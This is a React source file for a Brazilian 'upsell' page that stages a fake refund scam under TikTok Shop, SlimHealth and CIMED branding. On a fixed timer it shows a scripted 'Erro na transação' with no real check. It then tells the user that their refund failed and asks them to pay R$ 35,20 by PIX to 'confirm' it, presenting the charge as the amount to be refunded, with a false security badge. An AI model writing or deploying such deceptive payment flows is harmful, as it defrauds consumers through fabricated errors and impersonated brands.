import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { XCircle, Info, Shield, CheckCircle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { PixPaymentModal } from "@/components/PixPaymentModal";
import { useParadisePix } from "@/hooks/useParadisePix";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const UPSELL_AMOUNT = 35.20;
const UPSELL_DESCRIPTION = "Confirmação de Reembolso";

const Upsell4Page = () => {
  const navigate = useNavigate();
  
  // Phase control
  const [phase, setPhase] = useState<'loading' | 'content'>('loading');
  const [showError, setShowError] = useState(false);
  
  // Modal state
  const [showModal, setShowModal] = useState(false);
  const [dadosPessoais, setDadosPessoais] = useState<{
    nome: string;
    email: string;
    cpf: string;
    telefone: string;
  } | null>(null);

  const {
    isLoading,
    error,
    qrCode,
    qrCodeBase64,
    paymentStatus,
    createPixPayment,
    startPolling,
    stopPolling,
    reset,
  } = useParadisePix();

  // Load customer data
  useEffect(() => {
    const dadosSalvos = localStorage.getItem('dadosPessoais');
    if (dadosSalvos) {
      setDadosPessoais(JSON.parse(dadosSalvos));
    }
  }, []);

  // Loading phase animation
  useEffect(() => {
    if (phase !== 'loading') return;

    // Show error text after 2s
    const errorTimer = setTimeout(() => {
      setShowError(true);
    }, 2000);
    
    // Switch to content phase after 3s
    const phaseTimer = setTimeout(() => {
      setPhase('content');
    }, 3000);

    return () => {
      clearTimeout(errorTimer);
      clearTimeout(phaseTimer);
    };
  }, [phase]);

  const handleOpenModal = async () => {
    setShowModal(true);
    
    if (!dadosPessoais) {
      toast.error("Dados do cliente não encontrados");
      return;
    }

    const customer = {
      name: dadosPessoais.nome,
      email: dadosPessoais.email,
      document: dadosPessoais.cpf,
      phone: dadosPessoais.telefone,
    };

    const success = await createPixPayment(
      UPSELL_AMOUNT,
      UPSELL_DESCRIPTION,
      customer,
      `upsell4_${Date.now()}`
    );

    if (success) {
      startPolling(() => {
        toast.success("Pagamento confirmado! Redirecionando para rastreio...");
        setShowModal(false);
        navigate('/rastreio');
      });
    }
  };

  const handleCloseModal = () => {
    stopPolling();
    setShowModal(false);
  };

  const handleRetry = () => {
    reset();
    handleOpenModal();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-white to-gray-50 flex flex-col">
      {/* Loading Phase */}
      {phase === 'loading' && (
        <div className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="w-full max-w-md text-center space-y-6">
            {/* Spinner */}
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-full border-4 border-rose-100 border-t-rose-500 animate-spin" />
            </div>

            <div className="space-y-3">
              <p className="text-lg text-gray-600 font-medium">
                Processando seu pagamento...
              </p>
              
              {/* Error text with fade-in */}
              {showError && (
                <p className="text-rose-500 font-semibold animate-fade-in">
                  Erro na transação
                </p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Content Phase */}
      {phase === 'content' && (
        <>
          {/* Header */}
          <div className="bg-white px-4 py-4 flex justify-center">
            <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
          </div>

          <div className="flex-1 flex flex-col items-center p-4">
            <div className="w-full max-w-md">
              {/* Main Container */}
              <div className="bg-white rounded-3xl shadow-lg border border-gray-100 p-6 space-y-5">
                
                {/* Card 1 - Error (Highlighted) */}
                <div className="bg-rose-50 rounded-2xl border-2 border-rose-500 p-6 text-center">
                  {/* 3D Icon with pulse */}
                  <div className="w-[70px] h-[70px] rounded-full flex items-center justify-center mx-auto mb-5
                    bg-gradient-to-br from-rose-500 to-rose-600
                    shadow-[0_8px_24px_rgba(244,63,94,0.4)]
                    animate-pulse">
                    <XCircle className="w-9 h-9 text-white" />
                  </div>
                  
                  <h1 className="text-2xl font-extrabold text-rose-500 mb-3">
                    Erro no Processamento
                  </h1>
                  <p className="text-gray-600 text-sm leading-relaxed">
                    Identificamos uma falha no processamento do seu reembolso. Para garantir que você receba o valor corretamente, precisamos que confirme o pagamento abaixo.
                  </p>
                </div>

                {/* Card 2 - Info */}
                <div className="bg-gray-50 rounded-2xl border-l-4 border-rose-500 p-5">
                  <div className="flex items-start gap-3">
                    <div className="w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <Info className="w-5 h-5 text-rose-500" />
                    </div>
                    <div>
                      <h2 className="font-bold text-[#1a1a2e] mb-2">
                        Processo de Reembolso
                      </h2>
                      <ul className="text-sm text-gray-600 space-y-1.5">
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>O valor será reembolsado após confirmação</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>Reembolso na mesma forma de pagamento</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>Prazo varia conforme seu banco</span>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>

                {/* Card 3 - Value */}
                <div className="bg-white rounded-2xl shadow-md border border-rose-100 p-6 text-center">
                  <p className="text-xs text-gray-400 uppercase tracking-wider font-semibold mb-3">
                    Valor a ser Reembolsado
                  </p>
                  <p className="text-5xl font-extrabold text-rose-500 relative inline-block mb-4">
                    R$ 35,20
                    <span className="absolute bottom-[-5px] left-[10%] w-[80%] h-[3px] 
                      bg-gradient-to-r from-transparent via-rose-500 to-transparent rounded" />
                  </p>
                  <p className="text-sm text-gray-500 mt-4">
                    Clique abaixo para confirmar o pagamento e iniciar o reembolso
                  </p>
                </div>

                {/* CTA Button */}
                <Button
                  onClick={handleOpenModal}
                  className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-5 rounded-2xl shadow-lg text-lg h-auto"
                >
                  CONFIRMAR PAGAMENTO
                </Button>

                {/* Security Badge */}
                <div className="flex items-center justify-center gap-3 bg-gray-50 rounded-xl p-4">
                  <Shield className="w-5 h-5 text-green-500" />
                  <span className="text-sm text-gray-600 font-medium">
                    Pagamento 100% seguro e criptografado
                  </span>
                </div>

                {/* Support Text */}
                <div className="bg-gray-50 rounded-xl p-4 border-l-4 border-rose-500">
                  <p className="text-sm text-gray-600">
                    Em caso de dúvidas, nossa{' '}
                    <a href="#" className="text-rose-500 font-semibold hover:underline">Central de Ajuda</a>
                    {' '}está disponível 24h para auxiliar você.
                  </p>
                </div>

                {/* Footer logos */}
                <div className="flex items-center justify-center gap-3 pt-4">
                  <img 
                    src={slimhealthLogo} 
                    alt="SlimHealth" 
                    className="h-7 object-contain opacity-70"
                  />
                  <span className="text-lg font-bold text-muted-foreground">+</span>
                  <img 
                    src={cimedLogo} 
                    alt="CIMED" 
                    className="h-5 object-contain opacity-70"
                  />
                </div>
              </div>
            </div>
          </div>
        </>
      )}

      {/* Modal de Pagamento PIX */}
      <PixPaymentModal
        isOpen={showModal}
        onClose={handleCloseModal}
        title="Confirmação de Reembolso"
        amount={UPSELL_AMOUNT}
        qrCode={qrCode}
        qrCodeBase64={qrCodeBase64}
        isLoading={isLoading}
        paymentStatus={paymentStatus}
        error={error}
        onRetry={handleRetry}
      />
    </div>
  );
};

export default Upsell4Page;
